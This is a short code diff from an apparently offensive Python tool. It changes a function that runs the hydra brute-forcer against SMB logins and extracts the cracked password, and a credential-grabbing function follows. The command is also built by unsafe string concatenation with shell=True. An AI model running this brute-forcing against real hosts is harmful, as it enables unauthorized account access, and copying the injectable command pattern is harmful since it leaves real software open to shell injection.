@@ -24,7 +24,7 @@ def hydraPass(ip, username, dictionary):
 
     """
     command = 'hydra -l '+ username + ' -P ' + dictionary + ' smb://' + ip + """ | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mK]//g" | awk '$6 ~ /^password:$/{print $7}'"""
-    return subprocess.check_output(command, shell=True).decode("utf-8").strip().split('\n')
+    return subprocess.check_output(command, shell=True).decode("utf-8").strip().split('\n')[0]
 
 
 def samGrab(ip, username, password):
